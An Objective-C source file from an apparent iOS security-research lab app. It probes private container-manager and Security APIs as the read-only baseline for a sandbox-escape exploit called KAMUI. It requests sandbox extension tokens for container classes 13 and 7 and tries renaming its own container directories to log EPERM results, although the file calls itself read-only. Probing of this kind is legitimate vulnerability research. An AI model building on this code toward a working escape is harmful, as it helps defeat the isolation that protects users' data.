//
//  P175KamuiCensus.m — the KAMUI MCM census (read-only). p175. 2026-11-18.
//  Companion: p173 (the escape fire). This tap mints murk's §2/§4 receipts
//  without firing: the class-2 part mapping, rename-EPERM law, and the
//  class-13 27.2-dead receipt — the baseline for the escape write-up.
//  Credit murk-sus (KAMUI, MIT).
//

#import "P175KamuiCensus.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <unistd.h>

#define P175_BUILD @"p175-kamui-census-v1"

static int g_fd = -1;
static void Lf(NSString *fmt, ...) NS_FORMAT_FUNCTION(1,2);
static void Lf(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (![s hasSuffix:@"\n"]) s = [s stringByAppendingString:@"\n"];
    if (g_fd >= 0) { const char *c = s.UTF8String; if (c) { write(g_fd, c, strlen(c)); fcntl(g_fd, F_FULLFSYNC); } }
}

@implementation P175KamuiCensus

+ (NSString *)tap {
    NSMutableString *o = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([docs stringByAppendingPathComponent:@"p175_kamui_census_log.txt"].fileSystemRepresentation,
                O_CREAT | O_WRONLY | O_TRUNC, 0644);
    NSString *head = [NSString stringWithFormat:
        @"=== p175 session %@ BUILD %@ ===\n%@\n"
        "KAMUI MCM census (read-only; murk §2/§4 receipts — credit murk-sus). PANIC-FREE.\n",
        LabLocalMilitaryNow(), P175_BUILD, [LabDeviceProfile identBlock]];
    Lf(@"%@", head); [o appendString:head];

    /* dynamic group read (murk §5) */
    void *s = dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_LAZY);
    void *(*taskCr)(void *) = (void *(*)(void *))dlsym(s, "SecTaskCreateFromSelf");
    CFTypeRef (*taskCopy)(void *, CFStringRef, void *) = (CFTypeRef (*)(void *, CFStringRef, void *))dlsym(s, "SecTaskCopyValueForEntitlement");
    NSString *group = nil;
    if (taskCr && taskCopy) {
        void *task = taskCr(kCFAllocatorDefault);
        CFTypeRef groups = taskCopy(task, CFSTR("com.apple.security.application-groups"), NULL);
        if (groups && [(__bridge NSArray *)groups count] > 0)
            group = ((__bridge NSArray *)groups)[0];
        if (groups) CFRelease(groups);
    }
    Lf(@"[*] app group: %@", group ?: @"NONE");

    /* class-2 part mapping via container_object_get_path (murk §1 table) */
    void *h = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_LAZY);
    if (h) {
        id (*getObj)(NSString *, NSString *, NSString *) = NULL;
        getObj = (id (*)(NSString *, NSString *, NSString *))dlsym(h, "container_object_get_path");
        void *(*qCreate)(void) = (void *(*)(void))dlsym(h, "container_query_create");
        void (*qClass)(void *, uint64_t) = (void (*)(void *, uint64_t))dlsym(h, "container_query_set_class");
        void *(*qRes)(void *) = (void *(*)(void *))dlsym(h, "container_query_get_single_result");
        char *(*qTok)(void *) = (char *(*)(void *))dlsym(h, "container_copy_sandbox_token");
        Lf(@"[*] container_query symbols: create=%d class=%d result=%d token=%d objpath=%d",
           qCreate != NULL, qClass != NULL, qRes != NULL, qTok != NULL, getObj != NULL);

        /* murk §4 — the EPERM law from OUR OWN data container (27.2 receipts) */
        NSString *home = NSHomeDirectory();
        NSArray<NSString *> *parts = @[@"Library/Preferences", @"Library/Caches",
                                        @"Documents", @"tmp", @"SystemData"];
        for (NSString *part in parts) {
            NSString *src = [home stringByAppendingPathComponent:part];
            if (![NSFileManager.defaultManager fileExistsAtPath:src]) continue;
            NSString *dst = [docs stringByAppendingFormat:@"P175_epertest_%@", part.lastPathComponent];
            errno = 0;
            BOOL ok = rename(src.fileSystemRepresentation, dst.fileSystemRepresentation);
            Lf(@"[ep] rename %@ -> %@ ok=%d errno=%d (%s)",
               part, dst.lastPathComponent, ok, errno, strerror(errno));
        }

        /* class-13 direct query — the 27.2 traversal-dead receipt (no group needed) */
        if (qCreate && qClass) {
            void *q = qCreate();
            qClass(q, 13);
            /* mutators kept out deliberately: bare class-13, no group, no part */
            void *res = qRes ? qRes(q) : NULL;
            char *tok = (res && qTok) ? qTok(res) : NULL;
            Lf(@"[13-direct] result=%@ token=%@ (27.2: NULL/NULL expected = traversal dead — murk §3)",
               res ? @"path" : @"NULL", tok ? @"RECEIVED" : @"NULL");
        }

        /* class-7 WITH our group but NO symlink (baseline for p173's diff) */
        if (group && qCreate) {
            void *q = qCreate();
            qClass(q, 7);
            void (*setG)(void *, void *) = (void (*)(void *, void *))dlsym(h, "container_query_set_group_identifiers");
            void (*setP)(void *, uint64_t) = (void (*)(void *, uint64_t))dlsym(h, "container_query_operation_set_part");
            void (*setF)(void *, uint64_t) = (void (*)(void *, uint64_t))dlsym(h, "container_query_operation_set_flags");
            if (setG) setG(q, (__bridge void *)group);
            if (setP) setP(q, 3);
            if (setF) setF(q, 0x8100000000ULL);
            void *res = qRes(q);
            char *tok = (res && qTok) ? qTok(res) : NULL;
            Lf(@"[7-nosymlink] result=%@ token=%@ (baseline: extension WITHOUT any symlink — a non-NULL token here means the part-3 grant is legitimately ours: confounds p173's receipt, logged honestly)",
               res ? @"path" : @"NULL", tok ? @"RECEIVED" : @"NULL");
        }
    } else {
        Lf(@"[-] libsystem_containermanager not loadable");
    }

    Lf(@"=== p175 done (read-only) ===");
    if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); g_fd = -1; }
    return o;
}

@end
